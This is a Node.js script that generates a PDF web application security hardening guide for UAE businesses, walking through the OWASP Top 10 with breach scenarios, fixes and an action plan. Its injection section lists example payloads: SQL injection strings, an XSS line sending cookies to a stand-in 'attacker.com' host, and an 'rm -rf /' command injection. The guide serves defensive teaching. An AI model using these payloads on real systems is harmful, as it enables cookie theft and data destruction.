#!/usr/bin/env node
/**
 * Generates: public/downloads/web-application-security-hardening-guide.pdf
 * Run with: node scripts/generate-web-app-security-guide.js
 */

const PDFDocument = require("pdfkit");
const fs = require("node:fs");
const path = require("node:path");

// Brand colours
const BRAND_CYAN = "#18A7B7";
const BRAND_BLUE = "#1F88BF";
const DARK_BG = "#020d14";
const TEXT_WHITE = "#FFFFFF";
const TEXT_MUTED = "#94a3b8";
const TEXT_BODY = "#cbd5e1";
const ACCENT_RED = "#f87171";
const ACCENT_GREEN = "#4ade80";
const ACCENT_ORANGE = "#fb923c";

const OUTPUT = path.join(__dirname, "../public/downloads/web-application-security-hardening-guide.pdf");
fs.mkdirSync(path.dirname(OUTPUT), { recursive: true });

const doc = new PDFDocument({ margin: 60, size: "A4", bufferPages: true });
doc.pipe(fs.createWriteStream(OUTPUT));

// ── helpers ────────────────────────────────────────────────────────────────

function header(title, sub) {
  doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
  doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
  doc.moveDown(4);
  doc.fontSize(28).fillColor(TEXT_WHITE).font("Helvetica-Bold").text(title, { align: "center" });
  if (sub) {
    doc.moveDown(0.5).fontSize(13).fillColor(TEXT_MUTED).font("Helvetica").text(sub, { align: "center" });
  }
  doc.moveDown(1);
}

function eyebrow(text) {
  doc.fontSize(9).fillColor(BRAND_CYAN).font("Helvetica-Bold").text(text.toUpperCase(), { characterSpacing: 2 });
  doc.moveDown(0.3);
}

function h2(text) {
  doc.fontSize(18).fillColor(TEXT_WHITE).font("Helvetica-Bold").text(text);
  doc.moveDown(0.5);
}

function h3(text) {
  doc.fontSize(13).fillColor(BRAND_CYAN).font("Helvetica-Bold").text(text);
  doc.moveDown(0.3);
}

function body(text) {
  doc.fontSize(11).fillColor(TEXT_BODY).font("Helvetica").text(text, { lineGap: 4 });
  doc.moveDown(0.6);
}

function bullet(items) {
  for (const item of items) {
    doc.fontSize(11).fillColor(TEXT_BODY).font("Helvetica").text(`• ${item}`, { lineGap: 3, indent: 12 });
  }
  doc.moveDown(0.5);
}

function divider() {
  doc.moveDown(0.5);
  doc.strokeColor(BRAND_CYAN).opacity(0.3).moveTo(60, doc.y).lineTo(doc.page.width - 60, doc.y).stroke();
  doc.opacity(1).moveDown(0.8);
}

function fix(items) {
  doc.fontSize(10).fillColor(ACCENT_GREEN).font("Helvetica-Bold").text("HOW TO FIX", { characterSpacing: 1 });
  doc.moveDown(0.2);
  for (const item of items) {
    doc.fontSize(11).fillColor(TEXT_BODY).font("Helvetica").text(`✓  ${item}`, { lineGap: 3, indent: 12 });
  }
  doc.moveDown(0.7);
}

function pageFooter() {
  const range = doc.bufferedPageRange();
  for (let i = range.start; i < range.start + range.count; i++) {
    doc.switchToPage(i);
    doc.fontSize(8).fillColor(TEXT_MUTED).font("Helvetica")
      .text(`Nexaguard Cyber Labs FZCO — nexaguardcyberlabs.com  |  Page ${i + 1} of ${range.count}`, 60, doc.page.height - 40, { align: "center" });
  }
}

// ── PAGE 1: COVER ──────────────────────────────────────────────────────────
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);

doc.moveDown(8);
doc.fontSize(10).fillColor(BRAND_CYAN).font("Helvetica-Bold").text("NEXAGUARD CYBER LABS", { align: "center", characterSpacing: 3 });
doc.moveDown(1.5);
doc.fontSize(32).fillColor(TEXT_WHITE).font("Helvetica-Bold")
  .text("Web Application Security\nHardening Guide\nfor UAE Businesses", { align: "center", lineGap: 6 });
doc.moveDown(1);
doc.fontSize(14).fillColor(TEXT_MUTED).font("Helvetica")
  .text("OWASP Top 10 in plain language. With real-world UAE context.", { align: "center" });
doc.moveDown(4);
doc.rect(60, doc.y, doc.page.width - 120, 1).fill(BRAND_CYAN);
doc.moveDown(1);
doc.fontSize(11).fillColor(TEXT_MUTED).font("Helvetica")
  .text("Prepared by Nexaguard Cyber Labs — Dubai, UAE", { align: "center" });
doc.moveDown(0.3);
doc.text("Edition 1 · 2026", { align: "center" });

// ── PAGE 2: FOREWORD ───────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("Foreword");
h2("A Note From the Practitioners");
body("The vast majority of UAE businesses run on web applications — customer portals, internal tools, e-commerce platforms, partner-facing APIs. Most of these applications were built quickly, by small teams, with security as an afterthought.");
body("That's not a moral failing. It's how products get built. The problem is that attackers know this, and they exploit it.");
body("This guide walks through the ten most common web application vulnerabilities — the OWASP Top 10 — but rewritten for the people who actually need to act on them. CTOs. IT leads. Engineering managers. Founders. Not security researchers.");
body("For each vulnerability, we cover what it is, why it matters in the UAE context, what it looks like when it goes wrong, and the specific steps to address it.");
body("Use this guide as a checklist. Walk through it with your engineering team. Mark what's already in place, what isn't, and what needs urgent attention.");
doc.moveDown(1);
doc.fontSize(12).fillColor(BRAND_CYAN).font("Helvetica-Bold").text("— Nexaguard Cyber Labs");

// ── PAGE 3: REAL WORLD CONTEXT ─────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("Context");
h2("How Vulnerabilities Get Exploited");
body("Before we walk through the OWASP Top 10, two anonymised scenarios from UAE organisations we've encountered. Both are real patterns.");
divider();
h3("Scenario 1 — Dubai-Based SaaS Company");
body("A customer portal with a search function. The development team skipped input validation. An attacker injected SQL queries through the search box and exfiltrated 40,000 customer records over a weekend. The breach was discovered on Monday morning.");
doc.fontSize(11).fillColor(ACCENT_ORANGE).font("Helvetica-Bold").text("Cost: AED 850,000 in remediation, regulatory reporting, and lost contracts.");
doc.moveDown(0.8);
divider();
h3("Scenario 2 — Abu Dhabi E-Commerce Startup");
body("JWT tokens for authentication — but the signature was never validated server-side. An attacker forged a token claiming admin privileges, accessed the admin panel, and downloaded the customer database.");
doc.fontSize(11).fillColor(ACCENT_ORANGE).font("Helvetica-Bold").text("Cost: Complete brand reset and 18 months of slow recovery.");
doc.moveDown(1);
body("These scenarios are illustrative, but the patterns are real. We see versions of them every week in our VAPT engagements across the UAE.");

// ── PAGE 4: A01 ────────────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A01 · Highest Risk");
h2("Broken Access Control");
body("Access control failures let users do things they shouldn't be able to do — view other users' data, modify other users' records, access admin features.");
h3("Why it matters in UAE");
body("Most UAE SaaS products handle multi-tenant data. A broken access control bug means Tenant A can read Tenant B's data — a direct breach of PDPL obligations.");
h3("What it looks like");
bullet([
  "URL parameter tampering: /api/orders/12345 → change to 12347 to see another customer's order",
  "Missing role checks on admin endpoints",
  "Direct object references without ownership verification",
  "Forced browsing to authenticated pages without valid session",
]);
fix([
  "Default deny — require explicit access grants on every endpoint",
  "Verify ownership on every record access (user owns this record OR has admin role)",
  "Use centralised authorisation logic, not scattered checks across the codebase",
  "Log all access control failures — they indicate probing behaviour",
  "Implement automated access control tests in your CI/CD pipeline",
]);

// ── PAGE 5: A02 ────────────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A02");
h2("Cryptographic Failures");
body("Sensitive data is exposed because it's transmitted, stored, or hashed using weak or no cryptography.");
h3("Why it matters in UAE");
body("UAE PDPL and CBUAE rules treat unencrypted personal and financial data as a serious compliance failure. Regulatory fines aside, the reputational damage is severe.");
h3("What it looks like");
bullet([
  "HTTP instead of HTTPS on internal endpoints",
  "Passwords stored as MD5 or SHA-1 hashes (trivially reversible)",
  "Sensitive data logged in plain text to error logs",
  "TLS 1.0 or 1.1 still enabled on production servers",
  "Sensitive API responses cached without expiry headers",
]);
fix([
  "Enforce TLS 1.2 minimum (TLS 1.3 preferred). Disable older protocols.",
  "Use bcrypt, Argon2id, or scrypt for password hashing — never MD5/SHA-1/SHA-256",
  "Encrypt sensitive data at rest with AES-256",
  "Validate certificate configuration monthly (target SSL Labs A or A+)",
  "Set proper cache-control headers on sensitive API responses",
]);

// ── PAGE 6: A03 ────────────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A03 · Most Exploited");
h2("Injection (SQL, XSS, Command)");
body("User input is treated as code. Attackers inject malicious instructions through form fields, URL parameters, or API payloads. Still the most common breach vector in the region.");
h3("What it looks like");
bullet([
  "SQL: '; DROP TABLE users; -- or ' OR 1=1 --",
  "XSS: <script>fetch('attacker.com?c='+document.cookie)</script> in a comment field",
  "Command: ; rm -rf / in a parameter passed to a shell command",
  "LDAP injection, XML injection, template injection in CMS systems",
]);
fix([
  "Use parameterised queries / prepared statements — NEVER concatenate user input into SQL",
  "Use ORMs correctly (Eloquent, Sequelize, Prisma) — they parameterise by default",
  "Sanitise and encode user input before rendering in HTML (encode for context: HTML, JS, URL)",
  "Implement a Content Security Policy (CSP) header to mitigate XSS impact",
  "Never pass user input to shell commands — use language-native APIs",
  "Use a WAF as a defence-in-depth layer (not a substitute for secure code)",
]);

// ── PAGE 7: A04 + A05 ──────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A04 & A05");
h2("Insecure Design & Security Misconfiguration");
h3("Insecure Design");
body("Security flaws baked into the architecture itself, not bolted-on bugs. These can't be patched — they require redesign.");
bullet([
  "No rate limiting on login endpoints → brute force possible",
  "Account recovery flows that leak whether an email is registered",
  "Password reset links that don't expire",
  "Business logic that can be bypassed by skipping workflow steps",
]);
fix([
  "Threat model the application during design — what could go wrong at each step?",
  "Apply defense-in-depth: limit blast radius of any single failure",
  "Rate limit all authentication and sensitive endpoints",
]);
divider();
h3("Security Misconfiguration");
body("Default settings, exposed admin interfaces, verbose error messages, unnecessary features enabled.");
bullet([
  "phpMyAdmin or admin panels exposed on production",
  "Stack traces with file paths and version numbers revealed in 500 errors",
  "Default credentials never changed (admin/admin)",
  "S3 buckets or Azure Blob Storage with public read",
  "Verbose Server headers revealing framework version",
]);
fix([
  "Harden default configurations of every framework and cloud platform at deployment",
  "Suppress verbose errors in production — log internally, show generic message to users",
  "Audit cloud storage permissions weekly with automated tools",
  "Remove or protect admin interfaces from public exposure (whitelist by IP or use VPN)",
  "Use security headers: HSTS, X-Content-Type-Options, X-Frame-Options",
]);

// ── PAGE 8: A06 + A07 ──────────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A06 & A07");
h2("Vulnerable Components & Authentication Failures");
h3("Vulnerable Components");
body("Using outdated libraries, frameworks, or platforms with known vulnerabilities. Most UAE production environments have at least 5–10 outdated packages with known CVEs.");
bullet([
  "npm packages, pip packages, Maven dependencies — all accumulate vulnerabilities",
  "WordPress plugins and themes are a major attack surface",
  "Out-of-date OS or server software",
]);
fix([
  "Run npm audit / pip-audit / equivalent on every codebase weekly",
  "Use Dependabot or Snyk to automate vulnerability alerts",
  "Subscribe to security advisories for major frameworks",
  "Patch SLA: critical CVEs within 7 days, high severity within 30 days",
]);
divider();
h3("Authentication Failures");
body("Login systems that allow weak passwords, session hijacking, credential stuffing, or unprotected admin access.");
bullet([
  "No rate limiting on login — allows password spray or brute force",
  "JWT tokens not validated server-side (see Scenario 2 in this guide)",
  "Session tokens stored in localStorage instead of HttpOnly cookies",
  "No MFA on admin accounts",
]);
fix([
  "Enforce strong password policy (12+ chars) AND check against known breach lists",
  "Enforce MFA on ALL admin accounts — no exceptions",
  "Rate limit and lock out after repeated failed authentication",
  "Use secure session management: HttpOnly, Secure, SameSite=Strict cookies",
  "Implement proper logout — invalidate session server-side, not just clear client storage",
]);

// ── PAGE 9: A08 + A09 + A10 ────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("OWASP A08, A09 & A10");
h2("Integrity Failures, Logging Gaps & SSRF");
h3("Software & Data Integrity Failures (A08)");
body("Auto-updates from untrusted sources, CI/CD pipelines without signature verification, unsigned updates.");
fix([
  "Verify all third-party code — use signature verification on downloads",
  "Lock dependency versions in production deployments",
  "Require code review and approval before CI/CD pipeline executes",
]);
divider();
h3("Security Logging & Monitoring Failures (A09)");
body("No logs, logs without context, logs that aren't monitored. The difference between a contained incident and a catastrophic breach is often detection speed.");
fix([
  "Log every authentication event, every admin action, every access control failure",
  "Centralise logs in a SIEM or log aggregation platform",
  "Set up alerts on: multiple failed logins, admin actions outside business hours, bulk data exports",
  "Test your alerting — know that it works before you need it",
]);
divider();
h3("Server-Side Request Forgery — SSRF (A10)");
body("The application makes outbound requests based on user-supplied input. Attackers trick the server into accessing internal resources (metadata APIs, internal services, cloud credential endpoints).");
fix([
  "Whitelist allowed outbound destinations — block private IP ranges (10.x, 172.16-31.x, 192.168.x)",
  "Disable URL schemas that aren't needed (file://, gopher://, dict://)",
  "In cloud environments, block access to the instance metadata service from application code",
]);

// ── PAGE 10: ACTION PLAN ───────────────────────────────────────────────────
doc.addPage();
doc.rect(0, 0, doc.page.width, doc.page.height).fill(DARK_BG);
doc.rect(0, 0, doc.page.width, 6).fill(BRAND_CYAN);
doc.moveDown(2);
eyebrow("Your Action Plan");
h2("This Week, This Month, This Quarter");

h3("This Week (Days 1–7)");
bullet([
  "Run npm audit / pip-audit on every active codebase. Document critical and high severity.",
  "Verify MFA is enforced on all admin accounts. Enable where missing.",
  "Check SSL Labs score for every public-facing application. Target A or A+.",
  "Audit cloud storage permissions for unintended public read/write access.",
]);

divider();

h3("This Month");
bullet([
  "Schedule a Web Application VAPT for any application handling sensitive or regulated data",
  "Review and update your password policy and session management implementation",
  "Implement basic security event logging and at least one alert (failed logins threshold)",
  "Patch all critical CVEs identified in your dependency audit",
]);

divider();

h3("This Quarter");
bullet([
  "Conduct a tabletop incident response exercise — can your team actually respond?",
  "Run security awareness training for the engineering team (OWASP focus)",
  "Establish a recurring automated vulnerability scanning programme",
  "Document your application's threat model (even a basic one is better than none)",
]);

divider();

doc.moveDown(0.5);
doc.fontSize(12).fillColor(BRAND_CYAN).font("Helvetica-Bold").text("If any of this surfaced concerns about your current applications, we'd be glad to walk you through a free 30-minute risk review.");
doc.moveDown(0.5);
doc.fontSize(11).fillColor(TEXT_BODY).font("Helvetica").text("Book one at nexaguardcyberlabs.com");

doc.moveDown(2);
doc.fontSize(9).fillColor(TEXT_MUTED).font("Helvetica").text(
  "Disclaimer: This guide is provided for educational purposes. The scenarios described are illustrative and based on common vulnerability patterns. Nexaguard Cyber Labs FZCO accepts no liability for actions taken based on this guide without professional consultation. For a formal security assessment, contact info@nexaguardcyberlabs.com.",
  { lineGap: 3 }
);

// ── FOOTER ON ALL PAGES ────────────────────────────────────────────────────
pageFooter();

doc.end();
console.log(`✅ Web Application Security Hardening Guide generated: ${OUTPUT}`);
